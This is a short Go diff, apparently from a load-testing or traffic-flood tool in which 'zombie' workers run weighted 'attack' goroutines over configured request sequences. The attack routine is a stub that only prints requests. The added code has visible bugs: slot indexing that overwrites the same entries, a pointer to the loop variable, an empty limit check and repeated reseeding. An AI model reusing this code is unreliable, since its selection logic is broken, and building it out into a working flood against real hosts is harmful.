@@ -8,6 +8,7 @@ import (
 	"runtime"
 	"encoding/json"
 	"time"
+	"math/rand"
 )
 func okaerinasai (conn net.Conn, cfg config) {
 	timeout := time.Millisecond * 5000
@@ -88,6 +89,25 @@ func hajime(zombie Zombie, handler chan int, cfg config){
 	zombie.Conn.Write([]byte(ack))
 
 	//Parse the command list and start the invasion!
+	cmdList := []*command{}
+	probcount := 0
+	problimit := 100
+	probslice := [100]*command{}
+	for _, cmd := range cfg.CommandList {
+		cmdList = append(cmdList, &cmd);
+	 	for i:= 0; i < cmd.Probability; i++ {
+			probslice[i] = &cmd
+			probcount ++
+			if probcount >= problimit {
+				//Handle this, probcount goes from 0-99
+			}
+		}
+	}
+	for i:= 0; i < runtime.GOMAXPROCS(0); i++ {
+		rand.Seed(time.Now().Unix())
+		
+		go attack(probslice[rand.Int()%100])
+	}
 
 	select {
 	case finger := <- handler:
@@ -97,6 +117,21 @@ func hajime(zombie Zombie, handler chan int, cfg config){
 			return
 		}
 
+	}
+}
+
+func attack(cmd *command) {
+	//Parse command list to create the variables needed to store whatever values. Going to use a map structure
+	
+	//do the command $iterations times.
+	for i:= 0; i < cmd.Iterations; i++ {
+		//For each iteration, iterate through all the sequences
+		for _, req := range cmd.Sequence {
+			fmt.Println (req)
+			//url = cmd.Url
+			//ctype = cmd.ContentType
+			//method = cmd.Method, etc
+		}
 	}
 }
 
